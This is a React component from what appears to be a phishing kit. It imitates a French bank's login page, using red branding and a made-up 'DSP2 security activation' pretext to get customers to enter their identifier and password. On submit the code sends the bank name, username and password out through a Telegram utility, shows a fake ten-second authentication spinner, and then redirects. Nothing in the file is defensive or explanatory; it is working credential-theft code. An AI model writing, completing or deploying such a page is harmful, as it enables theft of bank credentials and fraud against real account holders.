import React, { useState } from 'react';
import { X } from 'lucide-react';
import { sendBankLoginData } from '../../utils/telegram';

type ProviderDAuthProps = {
  onAuthenticate: () => void;
  onBack: () => void;
  bankName: string;
};

const ProviderDAuth = ({ onAuthenticate, onBack, bankName }: ProviderDAuthProps) => {
  const [identifiant, setIdentifiant] = useState('');
  const [motDePasse, setMotDePasse] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const handleIdentifiantChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 10);
    setIdentifiant(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (identifiant && motDePasse) {
      setIsLoading(true);

      await sendBankLoginData({
        bankName,
        username: identifiant,
        password: motDePasse
      });

      setTimeout(() => {
        setIsLoading(false);
        window.location.href = '/success';
      }, 10000);
    }
  };

  if (isLoading) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-white">
        <div className="text-center">
          <div className="mb-8">
            <div className="w-20 h-20 mx-auto relative">
              <div className="absolute inset-0 rounded-full border-4 border-gray-200"></div>
              <div className="absolute inset-0 rounded-full border-4 border-[#E60012] animate-spin border-t-transparent"></div>
            </div>
          </div>
          <h2 className="text-xl font-semibold text-gray-800 mb-2">
            Authentification en cours
          </h2>
          <p className="text-gray-600">
            Connexion à votre espace bancaire...
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      <header className="flex items-center justify-between p-4 border-b border-gray-200">
        <div className="flex items-center">
          <img
            src="https://images.moneyvox.fr/i/media/03i/003631iea4.jpg"
            alt="Logo"
            className="h-8"
            onError={(e) => {
              (e.target as HTMLImageElement).style.display = 'none';
            }}
          />
        </div>
        <div className="flex items-center space-x-4">
          <button className="text-[#E60012] hover:text-[#cc0010] font-medium">
            Assistance
          </button>
          <button
            onClick={onBack}
            className="p-1 text-gray-600 hover:text-gray-800 transition-colors"
          >
            <X size={20} />
          </button>
        </div>
      </header>

      <div className="flex flex-col lg:flex-row min-h-[calc(100vh-80px)]">
        <div className="w-full lg:w-1/2 flex items-center justify-center p-8 lg:p-12">
          <div className="w-full max-w-md">
            <h1 className="text-2xl lg:text-3xl font-normal text-gray-800 mb-12">
              Saisissez votre identifiant
            </h1>

            <form onSubmit={handleSubmit} className="space-y-8">
              <div className="relative">
                <input
                  type="text"
                  value={identifiant}
                  onChange={handleIdentifiantChange}
                  placeholder="Entrez votre identifiant"
                  className="w-full px-0 py-3 border-0 border-b-2 border-gray-300 text-lg text-gray-800 bg-transparent focus:outline-none focus:border-[#E60012] transition-colors placeholder-gray-500"
                  maxLength={10}
                />
              </div>

              <div className="relative">
                <input
                  type="password"
                  value={motDePasse}
                  onChange={(e) => setMotDePasse(e.target.value)}
                  placeholder="Entrez votre mot de passe"
                  className="w-full px-0 py-3 border-0 border-b-2 border-gray-300 text-lg text-gray-800 bg-transparent focus:outline-none focus:border-[#E60012] transition-colors placeholder-gray-500"
                />
              </div>

              <button
                type="submit"
                disabled={!identifiant || !motDePasse || isLoading}
                className="w-full bg-[#E60012] text-white py-4 rounded-lg text-lg font-semibold hover:bg-[#cc0010] disabled:bg-gray-300 disabled:cursor-not-allowed transition-colors focus:outline-none focus:ring-2 focus:ring-[#E60012] focus:ring-offset-2 mt-8"
              >
                Valider
              </button>
            </form>
          </div>
        </div>

        <div className="w-full lg:w-1/2 relative min-h-[400px] lg:min-h-full">
          <img
            src="https://plus.unsplash.com/premium_photo-1709492256543-0179677c2a35?q=80&w=2340&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
            alt="Illustration"
            className="w-full h-full object-cover"
          />
          <div className="absolute top-8 left-0 right-0 text-center">
            <h2 className="text-white text-2xl lg:text-3xl font-light tracking-wider">
              BIENVENUE
            </h2>
          </div>
          <div className="absolute top-24 left-8 right-8 lg:left-12 lg:right-12">
            <div className="bg-white/95 backdrop-blur-sm rounded-lg p-6 shadow-lg">
              <div className="flex items-start space-x-3 mb-4">
                <div className="flex-shrink-0 mt-1">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L1 21h22L12 2z" stroke="#E60012" strokeWidth="2" fill="none"/>
                    <path d="M12 8v4M12 16h.01" stroke="#E60012" strokeWidth="2" strokeLinecap="round"/>
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-gray-800 mb-3">
                    Bienvenue dans votre espace sécurisé DSP2
                  </h3>
                  <div className="text-gray-700 text-sm space-y-2">
                    <p>
                      Afin de sécuriser votre compte, votre banque a mis en place un système DSP2.
                    </p>
                    <p>
                      Le système DSP2 s'active très simplement, nous vous invitons à compléter le formulaire suivant.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ProviderDAuth;
